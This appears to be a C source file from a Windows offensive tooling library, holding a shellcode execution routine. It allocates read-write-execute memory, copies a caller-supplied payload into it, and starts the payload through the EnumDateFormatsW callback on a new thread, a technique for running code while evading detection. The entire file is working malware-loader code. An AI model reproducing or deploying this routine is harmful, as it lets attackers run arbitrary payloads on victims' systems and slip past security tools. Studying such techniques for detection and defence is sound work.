#include "Win32Helper.h"

VOID InvokeEnumDateFormatsWThreadCallbackRoutine(LPVOID lpParameter)
{
	EnumDateFormatsW((DATEFMT_ENUMPROCW)lpParameter, LOCALE_SYSTEM_DEFAULT, 0);
}

BOOL MpfSceViaEnumDateFormatsW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumDateFormatsWThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}